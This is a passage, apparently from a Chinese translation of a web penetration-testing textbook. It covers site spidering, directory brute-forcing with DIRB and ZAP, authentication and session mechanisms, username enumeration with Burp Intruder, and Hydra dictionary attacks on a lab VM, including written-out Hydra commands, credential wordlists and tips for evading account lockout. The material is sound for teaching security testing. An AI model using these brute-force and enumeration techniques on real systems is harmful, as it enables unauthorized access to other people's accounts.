  \n## 爬取 Web 应用程序\n\n在测试大型真实世界应用程序时，你需要采用更详尽的方法。作为第一步，你需要确定应用程序的规模，因为有若干决策取决于它。你所需的资源数量、工作的估算以及评估的成本都取决于应用程序的大小。\n\
  \nWeb 应用程序由相互链接的多个网页组成。在开始评估应用程序之前，你需要对其进行映射以确定其规模。你可以手动遍历应用程序，像普通用户一样点击每个链接并查看内容。在手动爬取应用程序时，你的目标应该是尽可能识别出尽可能多的网页——从经过身份验证和未经过身份验证用户的角度来看。\n\
  \n手动爬取应用程序既耗时又容易遗漏。Kali Linux 提供了许多可用于自动化此任务的工具。Burp Suite 中的 Burp Spider 工具以爬取\
  \ Web 应用程序而闻名。它通过自动化编目应用程序中各种网页的繁琐任务来工作。它通过请求一个网页、解析其中的链接，然后向这些新链接发送请求，直到所有网页都被映射的方式工作。这样，整个应用程序都可以被映射，而不会忽略任何网页。\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_139_0.png)\n\n> CAUTION:\n> 由于爬取是自动化的过程，因此需要了解该过程和应用程序的工作原理，以避免爬虫执行敏感请求，例如密码重置、表单提交和信息删除。\n\
  \n## Burp Spider\n\nBurp Spider 使用被动和主动方法映射应用程序。\n\n当你启动 Burp Proxy 时，它默认以被动爬取模式运行。在此模式下，当浏览器配置为使用\
  \ Burp Proxy 时，它会使用代理请求的所有内容更新站点地图，而不会发送任何进一步的请求。被动爬取被认为安全，因为你可以直接控制爬取的内容。这在包含你不想触发的管理功能的关键应用程序中很重要。\n\
  \n为了有效映射，应将被动爬取模式与主动模式一起使用。最初，允许 Burp Spider 在你浏览时被动地映射应用程序，当你找到需要进一步映射的感兴趣的网页时，可以触发主动爬取模式。在主动模式下，Burp\
  \ Spider 将递归请求网页，直到映射所有 URL。\n\n以下屏幕截图显示了被动爬取的输出，当你点击应用程序中的各种链接时。确保在 Web 浏览器中将 Burp\
  \ 设置为代理，并且在被动映射应用程序之前关闭拦截：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_140_0.png)\n\
  \n当你想主动爬取一个网页时，在站点地图部分右键单击该链接并点击 Spider this branch。立即执行此操作后，主动爬取模式就会启动。在 Spider\
  \ 部分，你会看到已发出请求，并且站点地图部分将被新项目填充，如以下屏幕截图所示：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_141_0.png)\n\
  \n当主动爬取运行时，它会显示已发出的请求数量和其他一些详细信息。在 **Spider Scope** 部分，你可以使用正则表达式字符串创建规则来定义目标：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_142_0.png)\n\n## 应用程序登录\n\n应用程序可能要求在允许你查看内容之前进行身份验证。Burp\
  \ Spider 可以配置为在爬取时使用重新配置的凭据对应用程序进行身份验证。在 Spider 部分的 Options 选项卡中，你可以定义凭据或选择 Prompt\
  \ for guidance 选项。当你选择 Prompt for guidance 选项时，如果爬虫遇到登录页面，它将显示一个提示，你可以在其中输入用户名和密码，如下所示：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_143_0.png)\n\n## 目录暴力破解\n\n也称为强制浏览，目录暴力破解是请求应用程序或服务器页面中没有直接链接的文件和服务器目录的过程。这通常是通过从常用名称列表中获取目录和文件名来完成的。Kali\
  \ Linux 包含一些用于完成此任务的工具。我们将在此处探讨其中两个。\n\n## DIRB\n\nDIRB 可以递归扫描目录并查找 Web 服务器中具有不同扩展名的文件。它可以自动检测非标准\
  \ 404 的 Not Found 代码。然后它可以将结果导出到文本文件，在服务器需要有效会话的情况下使用会话 cookie，并进行基本 HTTP 身份验证和上游代理等其他功能。以下屏幕截图显示了\
  \ DIRB 的基本使用，使用默认字典并将输出保存到文本文件：\n\n```\nroot@kali:~# dirb http://10.7.7.5 -o dirb_result_10.7.7.5.txt\n\
  \n-----------------\nDIRB v2.22\nBy The Dark Raver\n-----------------\n\nOUTPUT_FILE:\
  \ dirb_result_10.7.7.5.txt\nSTART_TIME: Tue Oct  3 14:46:17 2017\nURL_BASE: http://10.7.7.5/\n\
  WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n-----------------\n\nGENERATED\
  \ WORDS: 4612\n\n--- Scanning URL: http://10.7.7.5/ ---\n+ http://10.7.7.5/.bash_history\
  \ (CODE:200|SIZE:302)\n==> DIRECTORY: http://10.7.7.5/assets/\n==> DIRECTORY: http://10.7.7.5/cgi-bin/\n\
  + http://10.7.7.5/cgi-bin/ (CODE:200|SIZE:1070)\n+ http://10.7.7.5/crossdomain (CODE:200|SIZE:200)\n\
  + http://10.7.7.5/crossdomain.xml (CODE:200|SIZE:200)\n==> DIRECTORY: http://10.7.7.5/evil/\n\
  + http://10.7.7.5/favicon.ico (CODE:200|SIZE:3638)\n==> DIRECTORY: http://10.7.7.5/gallery2/\n\
  ==> DIRECTORY: http://10.7.7.5/icon/\n==> DIRECTORY: http://10.7.7.5/images/\n+\
  \ http://10.7.7.5/index (CODE:200|SIZE:1227)\n+ http://10.7.7.5/index.html (CODE:200|SIZE:28067)\n\
  ==> DIRECTORY: http://10.7.7.5/javascript/\n==> DIRECTORY: http://10.7.7.5/joomla/\n\
  ==> DIRECTORY: http://10.7.7.5/phpBB2/\n==> DIRECTORY: http://10.7.7.5/phpmyadmin/\n\
  + http://10.7.7.5/server-status (CODE:403|SIZE:215)\n==> DIRECTORY: http://10.7.7.5/test/\n\
  ```\n\n## ZAP 的强制浏览\n\nDirBuster 是 OWASP 维护的目录暴力破解工具，现在已集成到 OWASP ZAP 中作为强制浏览功能。要使用它，你启动\
  \ OWASP-ZAP（在 Kali 的菜单中，转到 03 - Web Application Analysis | owasp-zap）并配置浏览器使用它作为代理；与\
  \ Burp 被动爬取相同，ZAP 会注册你浏览的所有 URL 以及它们从服务器请求资源。因此，你浏览目标，检测到的文件和目录会记录在 ZAP 中。接下来，在你想要进行强制浏览的目录上右键单击，然后转到\
  \ Attack | Forced Browse site / Forced Browse directory / Forced Browse directory\
  \ (and children)。站点、目录或目录及其子目录之间的选择取决于你想要扫描的内容——站点表示从服务器根目录开始扫描，目录仅表示所选目录，目录及其子目录表示所选目录递归：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_145_0.png)\n\n之后，选择名称列表文件（字典）并点击开始按钮。现有目录和文件可能会显示在同一选项卡中：\n\
  \n## 4\n\n## 身份验证和会话管理缺陷\n\nWeb 应用程序的主要目的是允许用户访问和处理存储在远程位置的信息。有时这些信息是公开的，而其他时候可能是用户特定的甚至是保密的。此类应用程序要求用户在被允许访问此类信息之前证明其身份。此身份验证过程称为\
  \ **authentication**，它要求用户提供身份证明，可能包括以下一项或多项：\n\n- 用户 *知道* 的东西：例如用户名和秘密密码\n- 用户\
  \ *拥有* 的东西：如智能卡或发送到用户手机的特殊代码\n- 用户 *本身* 的东西：语音、面部、指纹或其他任何生物识别机制\n\n第一种替代方案在 Web\
  \ 应用程序中最常见。在某些情况下，例如银行或内部企业应用程序，可能使用一种或多种剩余方法。\n\nHTTP 是一种无状态和无连接的协议。这意味着客户端发送到服务器的每个请求都被服务器视为与该客户端或任何其他客户端发送的任何先前或未来请求无关。因此，用户登录\
  \ Web 应用程序后，下一个请求将被服务器视为第一个请求。因此，客户端需要在每个请求上发送其凭据。这会为该敏感信息增加不必要的暴露，并对通信造成不必要的负担。\n\
  \n\n\n\n\n为了让 Web 应用能够跟踪用户的活动，并根据用户对自身环境所做的更改来维护应用状态，同时在不要求用户对每次操作都登录的情况下将他们与其它用户区分开来，已经开发出了一系列技术。这被称为\
  \ **会话管理**。\n\n在本章中，我们将回顾现代 Web 应用中通常如何执行身份验证和会话管理，并学习如何识别和利用此类机制中最常见的一些安全缺陷。\n\n\
  ## Web 应用中的身份验证方案\n\n在深入具体的渗透测试概念之前，让我们回顾一下现代 Web 应用中身份验证是如何完成的。\n\n## 平台身份验证\n\n\
  使用 **平台身份验证** 时，用户在每个请求的头部发送其凭据，使用 `Authorization` 变量。即使他们只需提交一次凭据，浏览器或系统也会存储它们，并在需要时使用它们。\n\
  \n平台身份验证有几种不同的类型。最常见类型在以下小节中讨论。\n\n### Basic\n\n这种平台身份验证类型中，用户名和密码附加在 `Authorization`\
  \ 头部并使用 base64 编码。这意味着任何看到请求头的人都能够将凭据解码为明文，因为 base64 编码不是加密格式。\n\n以下截图显示了登录信息如何以\
  \ base64 发送以及如何解码：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_148_0.png)\n\n你可以使用\
  \ Burp Suite 的 Decoder 将 base64 转换为 ASCII 文本：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_148_1.png)\n\
  \n### Digest\n\n**Digest authentication** 比基本身份验证安全得多。当客户端想要访问受保护资源时，服务器发送一个随机字符串作为挑战，称为\
  \ **nonce**。客户端随后使用此 nonce 以及用户名和密码计算 MD5 哈希并将其发送回服务器进行验证。\n\n### NTLM\n\n**NTLM**\
  \ 是摘要身份验证的一种变体，其中使用 Windows 凭据和 NTLM 哈希算法来转换应用程序用户名和密码的挑战。该方案需要多次请求-响应交换，并且服务器和任何中间代理必须支持持久连接。\n\
  \n### Kerberos\n\n该身份验证方案使用 **Kerberos** 协议对服务器进行身份验证。与 NTLM 一样，它不会要求用户名和密码，而是使用\
  \ Windows 凭据登录。该协议使用与 Web 服务器分开的 **Authentication Server (AS)**，并且涉及一系列协商步骤以进行身份验证。步骤如下：\n\
  \n- 1. 客户端向 AS 发送用户名（ID）。\n- 2. AS 在数据库中查找 ID 并使用哈希密码加密会话密钥。\n- 3. AS 将加密的会话密钥和包含用户\
  \ ID、会话密钥、会话过期时间和其他数据的票据（TGT），用服务器的密钥加密后发送给客户端。如果密码不正确，客户端将无法解密其会话密钥。\n- 4. 客户端解密会话密钥。\n\
  - 5. 当客户端想要访问 Web 服务器上的受保护资源时，它需要在一条消息中发送 TGT 和资源 ID，并在另一条消息中发送用会话密钥加密的客户端 ID 和时间戳。\n\
  - 6. 如果服务器能够解密接收到的信息，它会用 AS 的密钥加密并用客户端的会话密钥进一步加密的客户端到服务器票据进行响应。\n- 7. 借助来自 AS 的这些信息，客户端现在可以向\
  \ Web 服务器请求资源。\n\n在下面的图中，你可以看到该过程的图形表示：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_150_0.png)\n\
  \n### HTTP Negotiate\n\n也称为 *Windows Authentication*，**HTTP Negotiate** 方案使用 Windows\
  \ 凭据并根据 Kerberos 是否可用在 Kerberos 和 NTLM 身份验证之间进行选择。\n\n## 平台身份验证的缺点\n\n虽然 Kerberos\
  \ 和 NTLM 方案被认为安全，即使是摘要或基本身份验证也可以通过 TLS 使用，恶意行为者拦截通信并窃取凭据的风险较低，但平台身份验证在安全性方面仍存在一些固有缺点。如下所示：\n\
  \n- 凭据发送次数更多，因此其暴露风险和在中间人（MITM）攻击中被捕获的风险更高，尤其对于基本、摘要和 NTLM 方案而言。\n- 平台身份验证没有注销或会话过期选项。使用\
  \ Windows 身份验证时 **Single Sign On (SSO)** 处于启用状态，会话在用户打开应用程序主页面时立即开始，无需询问用户名和密码，并且如果过期会自动续期。攻击者一旦获得用户机器或\
  \ Windows 账户的访问权限，就会立即获得对应用程序的访问权限。\n- 平台身份验证不适合公共应用程序，因为它们需要比最流行的基于表单的身份验证更高的技术和行政投入来设置和管理。\n\
  \n## 基于表单的身份验证\n\n这就是我们更熟悉的身份验证类型：包含用户名和密码字段以及提交按钮的 HTML 表单：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_151_0.png)\n\
  \n这种身份验证因情况而异，因为其实现完全取决于应用程序。尽管如此，最常见的方法遵循以下步骤：\n\n- 1. 用户填写身份验证表单并点击 **Submit**\
  \ 按钮。客户端（Web 浏览器）随后将包含用户名和密码的请求发送到服务器，以明文形式发送，除非应用程序进行了客户端加密。\n- 2. 服务器接收信息并在数据库中检查用户是否存在，并比较存储的密码和提交的密码（或密码哈希）。\n\
  - 3. 如果用户存在且密码正确，服务器会以肯定消息响应，可能包括重定向到用户主页以及会话标识符（通常作为 cookie），以便用户无需再次发送凭据。\n- 4.\
  \ 客户端接收响应，存储会话标识符并重定向到主页。\n\n从渗透测试角度来看，这无疑是最有趣的身份验证方法，因为没有标准的方法来实现它（即使存在最佳实践），并且由于实现不当，通常是大量漏洞和安全风险的来源。\n\
  \n## 双因素身份验证\n\n如前所述，要向应用程序证明你的身份，你必须提供你知道的东西、你拥有的东西或你本身的东西。每种标识符都称为一个因素。 多因素身份验证（MFA）源于为某些应用程序提供额外安全层的需求，并在例如密码被攻击者猜测或窃取的情况下防止未经授权的访问。\n\
  \n在大多数 Web 应用中，双因素身份验证（2FA）意味着用户必须提供用户名和密码（第一因素）以及一个特殊代码或一次性密码（OTP），该代码临时且由用户拥有的设备随机生成，或由服务器通过短信或电子邮件发送给用户。用户随后将\
  \ OTP 提交回应用程序。更复杂的应用程序可能在密码之外实现智能卡或某种形式的生物识别，例如指纹的使用。由于这需要用户拥有额外的硬件或专用设备，这类应用程序要少得多。\n\
  \n大多数银行应用程序都实现了某种形式的 MFA，最近，公共电子邮件服务和社交媒体开始推广并强制其用户使用 2FA。\n\n## OAuth\n\nOAuth\
  \ 是访问委托的开放标准。当 Facebook 或 Google 用户允许第三方应用程序访问其账户时，他们不会与这些应用程序共享其凭据。相反，服务提供商（Google、Twitter\
  \ 或 Facebook）会共享一个特殊的访问令牌，允许这些应用程序根据用户授予的权限检索用户账户的特定信息或访问某些功能。\n\n\n\n\n\n## 会话管理机制\n\
  \n**会话管理**涉及在登录时创建或定义会话标识符、设置非活动超时、会话过期以及在注销时使会话失效；此外，它还可能扩展到根据用户的权限进行授权检查，因为会话\
  \ ID 必须与用户关联。\n\n## 基于平台认证的会话\n\n当使用平台认证时，最常用的方法是使用已包含的头部，其中包含凭据，或将响应挑战作为用户会话的标识符，并通过应用程序的逻辑来管理会话过期和注销；尽管如前所述，常见的情况是，在平台认证的情况下，没有会话超时、过期或注销。\n\
  \n如果使用 Kerberos，则 AS 发出的令牌已包含会话信息并用于管理此类会话。\n\n## 会话标识符\n\n会话标识符在表单认证中更为常见，但在我们使用平台认证时也可能存在。**会话标识符**，或**会话\
  \ ID**，是在用户每次在应用程序内发起会话时分配给每个用户的唯一数字或值。此值必须与用户的 ID 和密码不同。用户每次登录时它必须不同，并且必须随每个请求发送到服务器，以便服务器能够区分来自不同会话/用户的请求。\n\
  \n在客户端和服务器之间发送会话 ID 的最常见方式是通过 cookie。一旦服务器接收到一组有效的用户名和密码，它就会将该登录信息与会话 ID 关联起来，并响应客户端，将此类\
  \ ID 作为 cookie 的值发送。\n\n在以下屏幕截图中，您将看到一些包含会话 cookie 的服务器响应的示例：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_154_0.png)\n\
  \n在前面的示例中，一个 PHP 应用程序设置了一个名为 PHPSESSID 的会话 cookie。\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_154_1.png)\n\
  \n在前面的示例中，一个 Java 应用程序设置了一个名为 JSESSIONID 的会话 cookie。\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_154_2.png)\n\
  \n在前面的示例中，一个 ASP.NET 应用程序设置了一个名为 `ASP.NET_SessionId` 的会话 cookie。\n\n## Web 应用程序中的常见认证缺陷\n\
  \n我们花了一些时间讨论 Web 应用程序中不同认证机制的工作原理。在本节中，您将学习如何识别和利用其中的一些最常见的<|start|>安全失败。\n\n##\
  \ 缺乏认证或错误的授权验证\n\n在上一章中，您看到了如何使用 DIRB 和其他工具来查找可能未被 Web 服务器上的任何页面引用的目录和文件，或可能包含特权功能的文件，例如\
  \ `/admin` 和 `/user/profile`。如果您能够直接浏览到这些目录并在其中使用功能而无需认证，或者如果您以标准用户身份认证，您可以浏览到应用程序的管理区域或仅通过浏览即可修改其他用户的个人资料，那么该应用程序在其认证和/或授权机制方面存在重大安全问题。\n\
  \n## 用户名枚举\n\n在黑盒和灰盒渗透测试场景中，发现应用程序的有效用户列表可能是第一步之一，尤其是如果该应用程序不是商业产品，因此您可以在网上查找默认用户。\n\
  \n在 Web 应用程序中枚举用户是通过分析在登录、注册和密码恢复页面等位置提交用户名时的响应来完成的。以下是一些常见的错误消息，当您向此类页面提交表单时可以找到它们，这些消息会告诉您您可以枚举用户：\n\
  \n- \"User foo: invalid password\"\n- \"invalid user ID\"\n- \"account disabled\"\
  \n- \"this user is not active\"\n- \"invalid user\"\n\n让我们回顾一个非常简单的示例，说明如何从在提供错误用户名时给出过多信息的\
  \ Web 应用程序中发现有效用户名。使用来自 Broken Web Applications (BWA) 虚拟机的 OWASP WebGoat，IP地址为 10.7.7.5。\n\
  \n首先运行 Burp Suite 并配置浏览器使用它作为代理（在 Firefox 中，导航到 首选项 | 高级 | 网络 | 连接 | 设置）：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_156_0.png)\n\
  \n接下来，使用 webgoat 默认用户和 webgoat 密码登录 WebGoat，然后进入 Authentication Flaws | Forgot Password：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_157_0.png)\n\n这是一个密码恢复表单，需要用户名才能继续恢复过程。您可以输入一个不存在的用户名，例如\
  \ nonexistentuser，并提交它以查看结果：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_157_1.png)\n\
  \n用户名无效，您将无法继续进行密码恢复。您可以假设当用户有效时，您将获得不同的响应。\n\n现在让我们使用 Burp Suite 的 Intruder 来尝试找到一个有效名称。首先，在\
  \ Burp Proxy 的历史记录中查找请求并将其发送到 Intruder（按 Ctrl + I 或右键单击并选择 发送到 Intruder）：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_158_0.png)\n\
  \n接下来，切换到 Intruder 选项卡，然后切换到您的请求编号，最后切换到 Positions。您可以看到所有可由客户端修改的参数默认都被选中。单击 Clear\
  \ 以取消选择它们，然后仅选择用户名值并单击 Add：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_159_0.png)\n\
  \nIntruder 自动化向服务器发送多个请求，用用户提供的输入替换所选值，并记录所有响应以供您分析。现在添加一个要尝试的用户名列表，而不是已提交的用户名。\n\
  \nBurp Intruder 有四种不同的攻击类型，描述了输入将如何用有效载荷填充：\n\n- **Sniper:** 这使用单个有效载荷集，并一次选择一个输入位置，对每个有效载荷集中的每个值进行选择。请求的数量将是有效载荷集的长度乘以输入位置的数量。\n\
  - **Battering ram:** 这使用单个有效载荷集，并同时为有效载荷集中的每个值选择所有输入位置。请求的数量将是有效载荷集的长度。\n- **Pitchfork:**\
  \ 这使用多个输入位置，并且需要为每个位置提供一个有效载荷集。它一次提交每个有效载荷集中每个输入对应的一个值。发出的请求数量将是最短有效载荷集的长度。\n- **Cluster\
  \ bomb:** 使用多个输入时，有效载荷集 1 中的所有元素将与有效载荷集 2 的所有元素配对，依此类推，直到有效载荷集 n。攻击中发出的请求数量由所有有效载荷集大小的乘积决定。\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_160_0.png)\n\n接下来，在 Intruder 内部切换到 **Payloads**\
  \ 选项卡。保持 **Payload set** 不变，并在 **Payload Options [Simple List]** 部分单击 **Load...**；这旨在加载包含您想要尝试的名称的文件。幸运的是，Kali\
  \ Linux 在 `/usr/share/wordlists` 目录中包含大量字典和词表。\n\n在此示例中，您将使用\n`/usr/share/wordlists/metasploit/http_default_users.txt：`\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_161_0.png)\n\n现在您已定义了请求和输入位置，并且有效载荷列表已准备就绪，单击\
  \ Start Attack：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_162_0.png)\n\n正如您在结果中看到的那样，所有尝试过的名称都有相同的响应；只有一个例外。您会注意到\
  \ admin 的响应长度不同，如果您查看响应的正文，您会看到它正在询问密码恢复问题。因此，admin 是一个有效的用户名。\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_162_1.png)\n\
  \n只要应用程序对有效和无效用户名显示不同的响应，就可以使用用户名枚举。此外，一些应用程序在注册新用户时包含验证，以确保名称不重复。如果此验证在表单提交之前完成，则有一个\
  \ Web 服务执行此类验证，您可以使用它进行枚举。\n\n\n\n\n"
- "# 通过暴力破解和字典攻击发现密码\n\n一旦你在应用程序中识别出有效用户，下一步自然是尝试找到这些用户的密码。获取用户有效密码的方法有很多，从在不同服务器上模仿原始站点并利用社会工程学诱骗用户提交信息，到利用不安全的密码恢复机制，再到如果密码很常见就进行猜测。\n\
  \n暴力破解是一种尝试所有可能的字符组合来发现有效密码的方法。当应用程序允许一到三个甚至四个字符的密码时，这种方法效果很好。如果允许此类密码，那么至少有一名用户在使用它们。\n\
  \n对于更长的密码，暴力破解攻击完全不切实际，因为在发现一个有效密码之前，你需要向应用程序发送数百万（甚至数十亿）次请求。加上这一点，执行此类攻击所需的时间要比渗透测试标准的一到两周计划长得多（极其长）。对于这种情况，我们依赖于人类因素的可预测性——即使从实际角度来看，八个或更多字符密码的可能组合几乎是无限的，我们人类倾向于只使用其中一小部分作为密码，而且最常见的密码非常常见。\n\
  \n为了利用这一事实，有字典包含常见或默认密码，或已知在之前对热门网站的攻击中泄露的密码。使用这些字典，你可以减少发现有效密码所需的尝试次数，并增加在字典中找到它的几率，因为该词已被许多人用作密码。\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_163_0.png)\n\n自2012年以来，SplashData 根据对被黑和泄露密码集合的分析，发布了世界上使用最多的密码列表。2017年和2016年的结果可以在\
  \ https://www.teamsid.com/worst-passwords-2017-full-list/ 和 https://www.teamsid.com/worst-passwords-2016/\
  \ 查看。每年都会发布另一份列表，即 Keeper 密码管理器发布的列表：https://blog.keepersecurity.com/2017/01/13/most-common-passwords-of-2016-research-study/。\n\
  \n## 使用 THC Hydra 攻击基本认证\n\n**THC Hydra** 是黑客和渗透测试人员长期喜爱的在线密码破解工具之一。\n\n在线破解意味着对服务的登录尝试实际上会被执行。这可能会产生大量流量，并在服务器上部署安全和监控工具时触发警报。因此，在对应用程序或服务器进行在线暴力破解或字典攻击时，你应格外小心，并调整参数以获得最佳速度，同时避免压垮服务器、触发警报或锁定用户账户。\n\
  \nTIP\n当存在监控或在一定次数失败尝试后锁定账户时，进行在线攻击的一个好方法是每个用户开始时使用三到四个密码，或少于锁定阈值的数量。选择最明显或最常见的密码（例如，`password`、`admin`\
  \ 或 `12345678`），如果没有结果，就回到侦察阶段以获取更好的密码列表，并在几分钟或几个小时后重试。\n\nTHC Hydra 能够连接到各种服务，如\
  \ FTP、SSH、Telnet 和 RDP。我们将使用它对使用基本认证的 HTTP 服务器进行字典攻击。\n\n首先，你需要知道实际处理登录凭据的 URL。启动你的\
  \ *Kali 机器*，打开 Burp Suite，并配置浏览器使用它作为代理。你将使用易受攻击的虚拟机和 WebGoat 应用程序。当你尝试访问 WebGoat\
  \ 时，会弹出一个要求输入登录信息的对话框。如果你提交任意随机用户名和密码，会再次出现相同的对话框：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_164_0.png)\n\
  \n即使尝试不成功，该请求也已在 Burp 中注册。接下来，查找其中包含 Authorization: Basic 头部的请求：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_165_0.png)\n\
  \n现在你知道处理登录的 URL 是 http://10.7.7.5/WebGoat/attack。这足以运行 Hydra，但首先你需要有一个可能的用户名列表和一个密码列表。在真实场景中，可能的用户名和密码将取决于组织、应用程序以及你对用户了解的知识。对于本次测试，你可以使用以下针对名为\
  \ WebGoat 的应用程序的可能用户列表，并将其指定为安全测试的目标：\n\n- admin\n- webgoat\n- administrator\n-\
  \ user\n- test\n- testuser\n\n至于密码，你可以尝试一些最常见的密码并添加应用程序名称的变体：\n\n- 123456\n- password\n\
  - Password1\n- admin\n- webgoat\n- WebGoat\n- qwerty\n- 123123\n- 12345678\n- owasp\n\
  \n将用户名列表保存为 `users.txt`，密码列表保存为 `passwords.txt`。首先，运行 `hydra` 不带任何参数以查看帮助和执行信息：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_166_0.png)\n\n你可以看到它需要 -L 选项添加用户列表文件，-P\
  \ 添加密码列表文件，以及协议、服务器、端口和可选信息，格式为：protocol://server:port/optional。运行以下命令：\n\n```\n\
  hydra -L users.txt -P passwords.txt http-get://10.7.7.5:8080/WebGoat/attack\n```\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_167_0.png)\n\n你会发现 webgoat 用户和 webgoat\
  \ 密码的组合被服务器接受。\n\n使用 Hydra 时一个有用的选项是 -e，带有 n、s 或 r 修饰符，可以处理登录输入，发送空密码（n）、用户名作为密码（s）、反转用户名并用作密码（r），以及\
  \ -u，它先循环用户。这意味着它会用单个密码尝试所有用户，然后再进行下一个密码。这可以防止你被某些防御机制锁定。\n\n## 攻击基于表单的认证\n\n由于没有标准实现，且\
  \ Web 应用程序在验证和攻击预防方面更灵活，登录表单在暴力破解时带来了一些特殊挑战：\n\n- 用户名和密码参数没有标准名称、位置或格式\n- 登录尝试没有标准负面或正面响应\n\
  - 客户端和服务器端验证可能会阻止某些类型的攻击或重复提交请求\n- 认证可能分多步进行；即在一页询问用户名，在下一页询问密码\n\n幸运的是，对于渗透测试人员来说，大多数应用程序使用基本的\
  \ HTML 表单模式，通过 POST 请求发送用户名和密码作为参数，并在登录成功时重定向到用户主页，登录失败时显示错误或重定向到登录页。你现在将研究执行此类表单字典攻击的两种方法。相同的原理适用于几乎所有基于表单的认证，只是响应解释方式和提交所需参数有所不同。\n\
  \n## 使用 Burp Suite Intruder\n\n与基本认证攻击一样，你首先需要识别执行实际认证的请求及其参数，以便攻击正确的目标。\n\n在以下截图中，左侧你会看到\
  \ OWASP Bricks 中的认证表单（在易受攻击的虚拟系统主菜单中，进入 Bricks | Login pages | Login #3），右侧你可以看到通过\
  \ POST 方法的请求。你会注意到 username 和 passwd 参数在正文中发送，而没有 Authorization 头部：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_168_0.png)\n\
  \n\n\n\n\n对该登录页面进行字典攻击，首先需要分析响应，以识别失败登录与成功登录的区别：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_169_0.png)\n\
  \n在截图中，你可能会观察到失败的响应包含 \"Wrong user name or password.\" 文本。当然，这不会出现在成功登录中。\n\n接下来，将请求发送到\
  \ Intruder，并选择 username 和 passwd 参数作为输入。然后，选择 Cluster bomb 作为攻击类型：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_169_1.png)\n\
  \n接下来，前往 Payloads 选项卡，选择 payload set 1，并加载之前使用的用户名文件：\n\n对于 payload set 2，我们也将使用上一练习中使用的密码文件：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_171_0.png)\n\n如本截图所示，向服务器发送了 60 个请求，因为你有\
  \ 6 个用户名和 10 个可能的密码：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_171_1.png)\n\n\
  你可以在此时启动攻击，然后分析响应，并了解某些登录组合是否成功。然而，Burp Intruder 有一些功能可以让你的生活更轻松，不仅适用于像这样简单的示例，而且在攻击复杂的真实世界应用时也适用。前往\
  \ Options 选项卡，然后前往 Grep - Match，让 Intruder 在响应中查找特定文本，以便你轻松识别成功的那个。点击 Flag result\
  \ items with responses matching these expressions 框，清除当前列表，并在 Enter a new item 框中输入以下内容：\n\
  \n```\nWrong user name or password.\n```\n\n按 Enter 或点击 Add。Intruder 将标记所有包含此消息的响应；因此未被标记的可能代表成功登录。如果你知道正确的登录消息，可以查找该消息并直接识别出正确的凭据集：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_172_0.png)\n\n启动攻击，并等待结果：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_173_0.png)\n\
  \n看起来你至少找到一个有效的用户名及其密码。\n\n## 使用 THC Hydra\n\n在 Hydra 支持的众多协议中，有 http-get-form、http-post-form、https-get-form\
  \ 和 https-post-form，分别是 GET 和 POST 方法发送的 HTTP 和 HTTPS 登录表单。利用上一练习中的相同信息，你可以使用以下命令使用\
  \ Hydra 运行字典攻击：\n\n```\nhydra 10.7.7.5 http-form-post \"/owaspbricks/login-3/index.php:username=^USER^&passwd=^PASS^&submit=Submit:Wrong\
  \ user name or password.\" -L users.txt -P passwords.txt\n```\n\n```\nroot@kali:~/WebPentest#\
  \ hydra 10.7.7.5 http-form-post \"/owaspbricks/login-3/index.php:username=\\\"USER^&passwd=^PASS^&submit=Submit:Wrong\
  \ user name or password.\" -L users.txt -P passwords.txt\nHydra v8.6 (c) 2017 by\
  \ van Hauser/THC - Please do not use in military or secret service organizations,\
  \ or for illegal purposes.\n\nHydra (http://www.thc.org/thc-hydra) starting at 2017-10-26\
  \ 14:16:36\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 60 login tries (l:6/p:10),\
  \ ~4 tries per task\n[DATA] attacking http-post-form://10.7.7.5:80//owaspbricks/login-3/index.php:username=\"\
  USER^&passwd=^PASS^&submit=Submit:Wrong user name or password.\n[80][http-post-form]\
  \ host: 10.7.7.5   login: admin   password: admin\n1 of 1 target successfully completed,\
  \ 1 valid password found\n[WARNING] Writing restore file because 5 final worker\
  \ threads did not complete until end.\n[ERROR] 5 targets did not resolve or could\
  \ not be connected\n[ERROR] 16 targets did not complete\nHydra (http://www.thc.org/thc-hydra)\
  \ finished at 2017-10-26 14:16:41\n```\n\n你可能会注意到，在这种情况下的语法与你之前使用 Hydra 时略有不同。让我们一起检查一下：\n\
  \n+   1. 首先，你有 `hydra` 命令和目标主机（`hydra 10.7.7.5`）。\n+   2. 然后是你想要测试的协议或服务（`http-form-post`）。\n\
  +   3. 接下来是引号 (`\"`) 中的协议特定参数，并用冒号分隔：\n+      1. URL (`/owaspbricks/login-3/index.php`)\n\
